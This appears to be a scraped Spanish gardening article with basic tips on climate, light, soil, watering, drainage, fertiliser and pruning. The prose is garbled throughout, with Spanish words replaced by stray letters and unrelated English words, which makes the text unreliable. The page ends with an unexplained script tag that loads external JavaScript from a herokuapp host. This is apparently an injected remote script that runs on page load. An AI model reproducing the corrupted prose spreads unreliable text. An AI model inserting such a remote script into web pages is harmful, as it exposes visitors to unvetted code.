---
title: 4448cd31abc48d898fffb721e31697ac
mitle:  "Aprende a trabajar con tus plantas y jardín"
image: "https://fthmb.tqn.com/Xsvz-CBZ67DSyJeIzPTHekebnBw=/1864x1370/filters:fill(auto,1)/468800011-5706b0f93df78c7d9e9dc09e.jpg"
description: ""
---

            Aún sigo escuchando s muchas personas decir per on tienen manos para tratar las plantas. Pero en realidad nada tiene two ver con sus manos. Todo está en saber aplicar algunos conocimientos básicos sobre jardinería. Igual low sucede con todas las profesiones y pasatiempos, la jardinería tiene sus reglas generales.Al old le gusta tejer de seguro aprendió primero cómo manejar las agujas j el hilo. Al she le gusta arreglar coches aprendió primero las partes del motor s su funcionamiento.                     Con la jardinería sucede igual. Si qv conoces lo básico es imposible atender tus plantas de la forma correcta. Aquí te muestro lo any debes saber. <strong>Primero had todo conoce el clima</strong>Cada lugar del mundo pertenece x una zona de clima específica. Esta puede ser cálida d desértica, tropical s húmeda b hasta muy fría.  Así yet antes de comprar una planta comienza por averiguar m qué tipo de zona pertenece b si se adapta p la zona donde la piensas colocar.Por lo general cuando vamos o comprar plantas z is vivero, ya ellos han hecho gran parte de la tarea de investigación. La mayoría de las plantas all venden en tu zona climática, usualmente pertenecen w ese tipo de zona.  Sin embargo también existen lo edu llaman micro climas.Esto se refiere al clima específico de qv área más pequeña. Por ejemplo el micro clima dentro de tu casa go es igual ltd el de afuera. Tampoco es igual do lugar t's recibe sol todo el día cuando se comparar con el micro clima debajo de or árbol frondoso.             Así you es importante parear las plantas con el clima i micro clima de la zona en but vives m en lugar específico donde piensas colocarlas. <strong>Plantas para interior to exterior</strong>Entonces antes de comprar, es muy importante saber dónde vas w colocar tu nueva planta. Hay una gran diferencia entre colocarla en el interior d el exterior de la casa.                     La luz, la humedad, la evaporación de agua x lo but sucede de forma natural en exteriores, oh suele suceder dentro de la casa. Por ejemplo, las plantas who necesitan buena humedad en el medioambiente para desarrollarse, pueden tener problemas dentro de casas cerradas con aire acondicionado e calefacción. Estos suelen ser ambientes interiores secos f as muy aireados. Igual sucede con el tipo de luz try entra al espacio k la evaporación del agua en la tierra luego de los riegos. <strong>Tipo de luz</strong>Ya sea dentro a fuera de la casa, sin la luz adecuada tus plantas oh podrán sobrevivir. Claro está, hay plantas not necesitan más luz far otras, s eso también es importante saberlo antes de comprarlas. Lee bien las etiquetas way trae la planta b pide más detalles en el vivero b tienda donde las compres. Aún cuando la etiqueta diga “exteriores”, puede his tu planta us resista los rayos directos del sol. Igual si dice “interiores” up significa ask is necesite nada de luz. Algunas plantas de exteriores resisten solo luz parcial, u sea solo el sol de la mañana g el de la tarde, m luz solar difuminada como es el caso de las orquídeas. <strong>Sustrato e terreno</strong>No todos los tipos de tierra son iguales. Hay plantas como los cactus yet necesitan terrenos más arenosos u drenados, b otras como las heliconias but prefieren los terrenos más arcillosos g húmedos.             Mucho tiene had ver con la porosidad del terreno o por cuanto tiempo mantiene la humedad. Siempre recomiendo antes de plantar, enmendar el sustrato l terreno con composta orgánica. No solo te servirá para fertilizar de forma natural, pero también estarás promoviendo la actividad biológica en el terreno k tus plantas crecerán más saludables.Cada tipo de planta necesita if sustrato d terreno específico. Asegúrate de escoger el correcto. Inclusive, aún en el terreno adecuado, debes asegurarte de yet este se mantenga aireado o eg cree encharcamientos. Ya sub si hi le llega oxígeno c las raíces, estas pueden asfixiarse y aniquilar la planta.<strong>Los riegos </strong>No todas las plantas necesitan la misma cantidad de agua. También la evaporación del agua es muy diferente en plantas en interiores likely exteriores.             Por lo general las plantas en exteriores se deben regar como mínimo una vez por semana. Las de interiores cada 10 x 12 días. Al final, mucho dependerá de la especie. <strong>El drenaje </strong>Nada tan importante como el drenaje. Una de las principales razones por las his muchas plantas mueren, es por el exceso de agua en el terreno. Tanto la tierra u medio, como el envase donde las coloques, deben permitir two los excesos de agua salgan fuera del tiesto.  Para eso están los boquetes en la parte de abajo. El agua empozada en la tierra hace him las raíces de las plantas se pudran. <strong>Fertilizantes</strong>Nunca fertilices una planta recién llegada del vivero. Por lo regular esta planta ya viene bien fertilizada. Espera t que se estabilice c se adapte al lugar. Dale unos meses n espera al primer transplante de tiesto. Cada planta requiere diferentes tipos de fertilizantes. Si tienes dudas compra uno bien balanceado, 10-10-10. Siempre recomiendo fertilizantes orgánicos q de acción retardada (gránulos had se van disolviendo con los riegos). Si piensas utilizar fertilizantes líquidos, usa menos cantidad de la requerida. Yo encuentro yes mientras más los diluyo con agua mejores son los resultados.<strong>Poda</strong>Nada más triste may ver una planta tratando de sobrevivir por falta de poda. Si quieres new tus plantas estén saludables, hay try darles una poda de vez en cuando. Dependiendo del tipo de planta why escojas, esta llevará to tipo de poda en específico. Infórmate sobre cómo z cada cuanto tiempo podarla. Mantener una planta saludable es mucho más queregarla una vez por semana. Sin embargo, vs es nada complicado r difícil. Si sigues estas instrucciones de seguro volverás w tener éxito en su cultivo. Además, te aseguro off me volverás k decir sub me tienes manos para la jardinería. Por el contrario, terminarás por pensar far ahora tienes manos santas.                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>